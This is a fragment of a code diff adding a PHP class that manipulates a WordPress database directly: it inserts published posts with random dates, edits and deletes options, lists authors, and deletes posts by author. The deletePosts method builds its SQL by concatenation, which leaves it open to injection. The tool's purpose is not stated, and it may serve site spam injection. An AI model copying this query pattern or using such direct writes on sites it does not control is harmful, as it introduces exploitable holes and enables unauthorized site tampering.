+                $urls[] = $homeUrl . '/?p=' . $row['ID'] . ';' . $row['post_title'];
+            }
+
+        }
+
+        return $urls;
+    }
+
+    public function lastPostDateQuery() {
+        //SELECT ID, post_date FROM `wp_posts` order by ID DESC LIMIT 1
+        $table = sprintf( '`%s`.`%sposts`', $this->dbName, $this->dbPrefix );
+        $query = "SELECT ID, post_date FROM $table order by ID DESC LIMIT 1";
+        $stmt  = $this->dsn->query( $query );
+
+        if ( $stmt ) {
+            $lastDateFetch = $stmt->fetch();
+            $date          = $lastDateFetch['post_date'];
+        } else {
+            $date = date( 'Y-m-d H:i:s' );
+        }
+
+        return $date;
+
+    }
+
+
+    public function insertPost( $title, $content, $date, $userId = '', $customSlug = '' ) {
+
+        $date   = ( $date === '' ) ? randDate() : $date;
+        $userId = ! $userId ? 1 : $userId;
+        $table  = sprintf( '`%s`.`%sposts`', $this->dbName, $this->dbPrefix );
+
+        $query = "INSERT INTO $table ( `post_author`, `post_date`,"
+            . " `post_date_gmt`, `post_content`, `post_title`, `post_excerpt`,"
+            . " `post_status`, `comment_status`, `ping_status`, `post_password`,"
+            . " `post_name`, `to_ping`, `pinged`, `post_modified`,"
+            . " `post_modified_gmt`, `post_content_filtered`, `post_parent`,"
+            . " `guid`, `menu_order`, `post_type`, `post_mime_type`,"
+            . " `comment_count`) VALUES (:user_id, :date, :date, :content,"
+            . " :title, '', 'publish', 'closed', 'closed', '', :slug, '', '',"
+            . " '0000-00-00 00:00:00.000000', '0000-00-00 00:00:00.000000', '',"
+            . " '0', '', '0', 'post', '', '0');";
+
+
+        $stmt = $this->dsn->prepare( $query );
+
+        $stmt->execute( array(
+            ':user_id' => $userId,
+            ':date'    => $date,
+            ':content' => $content,
+            ':title'   => $title,
+            ':slug'    => urlencode( $customSlug ),
+        ) );
+
+
+        return $this->dsn->lastInsertId();
+
+    }
+
+    public function viewAllAuthors() {
+        $table = sprintf( '`%s`.`%sposts`', $this->dbName, $this->dbPrefix );
+        $query = "SELECT DISTINCT post_author FROM $table";
+        $stmt  = $this->dsn->query( $query );
+
+
+        while ( $row = $stmt->fetch( PDO::FETCH_LAZY ) ) {
+            if ( $row['post_author'] ) {
+                echo $row['post_author'] . PHP_EOL;
+            }
+        }
+    }
+
+    public function insertWpOptions( $optionName, $optionValue ) {
+
+        $table = sprintf( '`%s`.`%soptions`', $this->dbName, $this->dbPrefix );
+        $query = "INSERT INTO $table ( option_name, option_value, autoload)"
+            . "VALUES (:option_name, :option_value, 'yes')";
+        $stmt  = $this->dsn->prepare( $query );
+        $stmt->execute( array(
+            ':option_name'  => $optionName,
+            ':option_value' => $optionValue,
+        ) );
+
+        return $this->dsn->lastInsertId();
+    }
+
+    public function updateWpOptions( $optionName, $optionValue ) {
+
+
+        $table = sprintf( '`%s`.`%soptions`', $this->dbName, $this->dbPrefix );
+        $query = "UPDATE $table set option_value = :option_value where option_name = :option_name";
+
+        $stmt = $this->dsn->prepare( $query );
+
+        return $stmt->execute( array(
+            ':option_value' => $optionValue,
+            ':option_name'  => $optionName,
+        ) );
+
+    }
+
+    public function deleteOption( $optionName ) {
+        $table = sprintf( '`%s`.`%soptions`', $this->dbName, $this->dbPrefix );
+        $query = "delete FROM $table where option_name = :option_name";
+
+        $stmt = $this->dsn->prepare( $query );
+
+        return $stmt->execute( array(
+            ':option_name' => $optionName,
+        ) );
+    }
+
+    public function deletePosts( $authors ) {
+        $authorsCommaSeparated = implode( ', ', $authors );
+
+        $table  = sprintf( '`%s`.`%sposts`', $this->dbName, $this->dbPrefix );
+        $column = sprintf( '`%sposts`.`post_author`', $this->dbPrefix );
+        $query  = "delete FROM $table where $column IN ($authorsCommaSeparated)";
+        $stmt   = $this->dsn->prepare( $query );
+        $stmt->execute();
+
+        return $stmt->rowCount();
+    }
+
+}
